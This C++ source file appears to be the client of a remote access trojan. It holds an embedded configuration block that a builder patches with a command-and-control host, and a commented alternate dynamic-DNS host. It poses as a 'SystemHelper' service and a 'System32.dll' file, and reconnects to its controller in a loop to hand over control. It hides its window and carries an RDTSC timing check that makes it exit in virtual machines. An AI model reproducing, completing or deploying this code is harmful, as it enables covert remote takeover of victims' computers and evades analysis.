#include "stdafx.h"
#include "windows.h"
#include "..//common//ClientSocket.h"
#include "MyKernelManager.h"
#include "login.h"

#if _MSC_VER < 1600
#pragma comment(linker, "/FILEALIGN:0x200 /OPT:NOWIN98")
#pragma comment(lib, "msvcrt.lib")
#endif

HMODULE hSelf = NULL;
TCHAR svcname[32] = _T("lx");

struct DLL_INFO
{
	CHAR IdChar[32];
	CHAR LoginAddr[150];
	UINT LoginPort;
	char ServiceName[50];
	char Dllname[50];
	char ReMark[50];
	bool isRootkit;
} SysInfo =
{
	"StartOfHostAndConfig",
	"127.0.0.1",		//127.0.0.1 192.168.1.145 lkyfire.vicp.net
	80,
	"SystemHelper",
	"System32.dll",
	"lx",
	false,
};

enum lx_status
{
	NOT_CONNECT, //  还没有连接
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};

DWORD WINAPI ConnectThread(LPVOID lp)
{
	DWORD dwIOCPEvent;

	HWINSTA hWinSta = OpenWindowStationW(L"winsta0", FALSE, MAXIMUM_ALLOWED);

	if (hWinSta != NULL)
		SetProcessWindowStation(hWinSta);

	SetErrorMode(SEM_FAILCRITICALERRORS);

	CClientSocket socketClient;
	BYTE bBreakError = NOT_CONNECT;

	while (true)
	{
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			Sleep(20000);
		}

		DWORD dwTickCount = GetTickCount();
		if (!socketClient.Connect(SysInfo.LoginAddr, SysInfo.LoginPort))
		{
			MsgErr(_T("!socketClient.Connect(lpszHost, dwPort)"));
			bBreakError = CONNECT_ERROR;
			continue;
		}

		sendLoginInfo(svcname, &socketClient, GetTickCount() - dwTickCount);

		CMyKernelManager manager(&socketClient, svcname, 1, NULL, SysInfo.LoginAddr, SysInfo.LoginPort);
		socketClient.setManagerCallBack(&manager);

		for (int i = 0; (i < 20 && !manager.IsActived()); i++)
		{
			Sleep(500);
		}

		if (!manager.IsActived())
		{
			MsgErr(_T("!manager.IsActived()"));
			continue;
		}

		dwTickCount = GetTickCount();

		do
		{
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 1000);
			Sleep(500);
		} while (dwIOCPEvent != WAIT_OBJECT_0);
	}
}

extern "C" __declspec(dllexport) DWORD WINAPI RoutineMain(LPVOID lp)
{
	//TCHAR MyPath[MAX_PATH*2];
	//GetModuleFileName(hSelf,MyPath,sizeof(MyPath));
	//CreateFile(MyPath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (lp != NULL)
	{
		memcpy(&SysInfo, lp, sizeof(DLL_INFO));
	}

	while (true)
	{
		ConnectThread(lp);
		Sleep(500);
	}
}

#ifdef EXEBUILD

//#pragma comment(linker,"/ENTRY:wWinMain")

int WINAPI _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
	HWND hwnd = CreateWindowExW(
		WS_EX_APPWINDOW,
		L"#32770",
		L"WindowsNet",
		WS_OVERLAPPEDWINDOW,
		0,
		0,
		100,
		100,
		HWND_DESKTOP,
		NULL,
		GetModuleHandleW(0),
		NULL
	);

	ShowWindow(hwnd, SW_HIDE);
	UpdateWindow(hwnd);

#ifdef LxVMs
	_asm
	{
		RDTSC
		xchg ecx, eax
		RDTSC
		sub eax, ecx
		cmp eax, 0FFh
		jl OK
		xor eax, eax
		push eax
		call ExitProcess
	}
OK:
#endif

	hSelf = GetModuleHandle(NULL);
	RoutineMain(NULL);

	return 0;
}

#else

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls(hModule);
		hSelf = hModule;
	}
	else if (ul_reason_for_call == DLL_PROCESS_DETACH)
	{
	}

	return true;
}

#endif
